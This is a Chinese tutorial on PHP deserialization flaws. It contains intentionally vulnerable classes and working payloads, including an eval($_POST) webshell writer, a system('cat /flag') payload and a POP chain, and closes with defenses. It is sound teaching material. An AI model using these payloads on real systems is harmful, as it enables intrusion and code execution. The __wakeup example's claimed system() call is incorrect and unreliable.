
**什么是序列化和反序列化？**

- **序列化 (Serialization)**：是将内存中的**变量、对象或复杂数据结构**（如数组）转换成一个**可存储或可传输的字符串**的过程。这个字符串完整地保留了原始数据的类型和结构信息。
- **反序列化 (Deserialization)**：是序列化的逆过程，即将这个特殊的字符串**还原回**原来的变量、对象或数据结构。

简单来说：

- **序列化 = 对象/数据 → 字符串**
- **反序列化 = 字符串 → 对象/数据**

这个机制非常有用，比如：

- **存储**：将用户会话（Session）数据保存到文件或数据库中。
- **传输**：在网络中传递复杂的对象数据。
- **缓存**：将计算结果序列化后缓存起来，下次直接反序列化使用，避免重复计算。
 
```c
serialize(mixed $value): string //将一个对象转换成一个字符串 
unserialize(string $data, array $options = []): mixed //将字符串还原成一个对象
```

**序列化后字符串标识：**
```c
a  - array          // 数组，格式：a:元素个数:{key;value;...}
b  - boolean        // 布尔值，b:1; 表示 true，b:0; 表示 false
d  - double         // 浮点数（double/float），如 d:3.1415;
i  - integer        // 整数，如 i:42;
o  - common object  // （已废弃）旧式对象，PHP 4 风格，现代 PHP 几乎不用
r  - reference      // （内部使用）对已存在变量的引用（PHP 5 中用于引用）
s  - string         // 字符串，格式：s:长度:"内容";
C  - custom object  // 实现了 Serializable 接口的自定义序列化对象
O  - class          // 普通类对象，格式：O:类名长度:"类名":属性数:{...}
N  - null           // 空值，直接写作 N;
R  - pointer reference // 引用（Reference），R:序号; 表示指向序列化流中第几个值的引用
U  - unicode string // Unicode 字符串（PHP 6 实验性特性，从未正式发布，实际不会出现）
```
---
**数组：**
```php
$arr = ['name' => 'Alice', 'age' => 20];
$str = serialize($arr);
// 结果: a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:20;}

$back = unserialize($str);
print_r($back); // 还原成原数组
```

**对象：**
```php
class User {
    public $name = 'Bob';
}
$obj = new User();
$str = serialize($obj);
// 结果: O:4:"User":1:{s:4:"name";s:3:"Bob";}

$newObj = unserialize($str);
echo $newObj->name; // 输出: Bob
```

---
**`public`、`protected`、`private` 属性在序列化时的区别**

| 可见性         | 序列化中的键名格式                   | 说明                                       |
| ----------- | --------------------------- | ---------------------------------------- |
| `public`    | `s:4:"name";`               | 直接是属性名                                   |
| `protected` | `s:7:"\x00*\x00name";`      | 前后加 `\x00*\x00`（`\x00` 是空字符）,s长度=成员名长度+3 |
| `private`   | `s:12:"\x00Class\x00name";` | 前后加 `\x00类名\x00`,s长度=类名长度+成员长度+2         |

```php
class Demo {
    public $pub = 'P';
    protected $pro = 'R';
    private $pri = 'I';
}

$obj = new Demo();
echo serialize($obj);

// 结果: O:4:"Demo":3:{s:3:"pub";s:1:"P";s:6:"*pro";s:1:"R";s:9:"Demo pri";s:1:"I";}
// 在 PHP 的 `serialize()` 输出中，**空字符 `\x00` 是不可见的二进制字符**，不会以 `\0` 或 `\x00` 的文本形式显示
// public    ：s:3:"pub"        → 长度 = 3（"pub"）
// protected ：s:6:"\0*\0pro"   → 长度 = 3（"pro"）+ 3 = 6
// private   ：s:9:"\0Demo\0pri"→ 长度 = 4（"Demo"）+ 3（"pri"）+ 2 = 9
```

---
**魔术方法**
```php
PHP把所有以`__`（两个下划线）开头的方法当作魔法方法
```

以下是 PHP 中**常见的魔术方法（Magic Methods）**，它们以双下划线 `__` 开头，在特定场景下会**自动触发**，在面向对象编程和反序列化漏洞利用中极为关键。

---

| 魔术方法                         | 触发时机                             | 典型用途 / 安全风险                       |
| ---------------------------- | -------------------------------- | --------------------------------- |
| `__construct()`              | 创建对象时                            | 初始化对象                             |
| `__destruct()`               | 对象被销毁时（脚本结束、unset等）              | **高危！** 常用于反序列化漏洞（如读文件、执行命令）      |
| `__wakeup()`                 | `unserialize()` 时自动调用            | 重新连接数据库等；**高危！** 可被利用             |
| `__sleep()`                  | `serialize()` 前调用                | 返回要序列化的属性名数组                      |
| `__toString()`               | 对象被当作字符串使用时（如 `echo $obj`）       | (触发的条件较多)**高危！** 若反序列化后被拼接/输出，会触发 |
| `__get($name)`               | 读取**未定义/不可访问**属性时                | 可用于属性访问控制或链式调用                    |
| `__set($name, $value)`       | 给**未定义/不可访问**属性赋值时               | 同上                                |
| `__isset($name)`             | 对未定义属性使用 `isset()` 或 `empty()` 时 | 自定义 isset 行为                      |
| `__unset($name)`             | 对未定义属性使用 `unset()` 时             | 自定义 unset 行为                      |
| `__call($name, $args)`       | 调用**不存在的非静态方法**时                 | 方法重载、动态代理                         |
| `__callStatic($name, $args)` | 调用**不存在的静态方法**时                  | 同上（静态版）                           |
| `__invoke()`                 | 当对象被当作函数调用时（如 `$obj()`）          | 让对象可调用                            |
| `__set_state($array)`        | `var_export()` 导出后重新导入时          | 用于重建对象（较少用）                       |
| `__clone()`                  | 使用 `clone` 复制对象时                 | 自定义克隆逻辑                           |

---

**产生反序列化漏洞原因：**
```php
PHP反序列化漏洞是针对对象在处理数据不当导致的，由于`unserialized()`函数的接受参数可控，传入的是序列化后的对象的属性，若在属性上进行篡改，便可实现攻击
```

**存在反序列化漏洞的前提条件**
```php
1. 必须有`unserialize()`函数存在
2. `unserialize()`函数接收的参数必须可控（为了达到传入的参数实现的功能，可能需要绕过某些魔法函数）
```

---
**反序列化漏洞实例：**

**`__destruct()` —— 最常见的入口点**

- `__destruct()` 在 **对象销毁时自动调用**（如脚本结束、`unset()`、作用域结束）。
- 攻击者只需让 `unserialize()` 创建一个带有恶意 `__destruct` 的对象，**无需后续操作**，脚本结束时自动触发。
- 因此它是反序列化漏洞的“黄金入口”。
```php
<?php
// 模拟存在漏洞的代码
class Logger {
    public $logFile = "/tmp/log.txt";
    public $data = "test";

    public function __destruct() {
        file_put_contents($this->logFile, $this->data); // 危险：可写任意文件
    }
}

// 危险！直接反序列化用户输入
$data = $_GET['data'] ?? '';
if ($data) {
    unserialize($data);
}
?>
```

攻击者构造 payload，将 `$logFile` 指向 Web 目录，写入一句话木马：

```php
// 构造对象：写入 shell.php
$obj = new Logger();
$obj->logFile = "./shell.php";
$obj->data = "<?php eval(\$_POST['cmd']); ?>";

// 序列化
$payload = serialize($obj);
// 结果: O:6:"Logger":2:{s:7:"logFile";s:11:"./shell.php";s:4:"data";s:30:"<?php eval($_POST['cmd']); ?>";}
```

**攻击请求**：
```
http://target.com/vuln.php?data=O:6:"Logger":2:{s:7:"logFile";s:11:"./shell.php";s:4:"data";s:30:"<?php eval($_POST['cmd']); ?>";}
```

脚本结束时，`__destruct()` 自动执行，写入 `shell.php`，攻击者即可连接。

---

**`__wakeup()` —— 反序列化瞬间触发**

- `__wakeup()` 在 `unserialize()` **执行后立即调用**。
- 比 `__destruct` 更“即时”，适合需要立刻执行的场景。
```php
<?php
class Config {
    public $config = [];

    public function __wakeup() {
        // 模拟自动加载配置并执行
        if (isset($this->config['callback'])) {
            call_user_func($this->config['callback']); // 危险！
        }
    }
}

unserialize($_GET['data']);
?>
```

攻击者传入一个可执行的回调函数（如 `system`）和参数：

```php
class Config {
    public $config = [
        'callback' => ['system', 'cat /flag']
    ];
}
$payload = urlencode(serialize(new Config()));
```

**攻击请求**：
```
http://target.com/vuln.php?data=O:6:"Config":1:{s:6:"config";a:1:{s:8:"callback";a:2:{i:0;s:6:"system";i:1;s:8:"cat /flag";}}}
```

 反序列化时立即触发 `__wakeup()`，执行 `system('cat /flag')`，回显 flag。

---

**`__toString()` —— 需要“被当作字符串”才触发**

- 不会自动触发！必须让对象参与**字符串操作**（如 `echo`, `.`, `json_encode`, 日志记录等）。
- 利用条件更苛刻，但很多框架会在日志、错误处理中隐式调用。
```php
<?php
class User {
    public $name = "Guest";
}

class FileReader {
    public $filename = "/etc/passwd";

    public function __toString() {
        return file_get_contents($this->filename); // 读文件
    }
}

$obj = unserialize($_GET['data']);
echo "Welcome, " . $obj->name; // 如果 $obj->name 是 FileReader 对象，就会触发 __toString()
?>
```

攻击者让 `$name` 是一个 `FileReader` 对象：

```php
$user = new User();
$user->name = new FileReader();
$user->name->filename = "/flag";

$payload = serialize($user);
```

**攻击请求**：
```
http://target.com/vuln.php?data=O:4:"User":1:{s:4:"name";O:10:"FileReader":1:{s:8:"filename";s:5:"/flag";}}
```

执行 `echo "Welcome, " . $obj->name` 时，PHP 发现 `$obj->name` 是对象，于是调用其 `__toString()`，返回 `/flag` 内容并输出。

---

**`__get()/ __call()` —— 构造 POP 链（高级利用）

- 当访问**不存在或不可访问的属性/方法**时触发。
- 单独看无害，但可与其他类的**危险方法**组合，形成调用链（POP Chain）。
- 这是现代反序列化漏洞（如 Laravel、ThinkPHP RCE）的核心技术。
```php
<?php
// 危险类：能执行命令
class Evil {
    public $cmd = "id";
    public function run() {
        system($this->cmd);
    }
}

// 触发类：通过 __call 调用任意方法
class Trigger {
    public $obj;
    public $method = "run";

    public function __call($name, $args) {
        call_user_func([$this->obj, $this->method]); // 危险！
    }
}

// 入口：反序列化后访问不存在的方法
$input = unserialize($_GET['data']);
@$input->nonExistentMethod(); // 触发 __call
?>
```

** 利用方式**
```php
$evil = new Evil();
$evil->cmd = "cat /flag";

$trigger = new Trigger();
$trigger->obj = $evil;

$payload = serialize($trigger);
```

**攻击请求**：
```
http://target.com/vuln.php?data=O:8:"Trigger":2:{s:3:"obj";O:4:"Evil":1:{s:3:"cmd";s:8:"cat /flag";}s:6:"method";s:3:"run";}
```

流程：
1. `unserialize()` 创建 `Trigger` 对象。
2. `$input->nonExistentMethod()` 不存在 → 触发 `__call()`。
3. `__call()` 执行 `[$this->obj, $this->method]` → 即 `$evil->run()`。
4. `Evil::run()` 执行 `system('cat /flag')`。

---

**如何防御反序列化**

```php
1. 绝不反序列化用户输入！这是根本原则。
2. 如必须使用，用 `json_decode` + 白名单校验代替。
3. 避免在魔术方法中使用动态函数（如 `call_user_func`, `system`, `eval`）。
4. 使用 `unserialize($data, ['allowed_classes' => ['SafeClass']])` 限制可反序列化的类。
```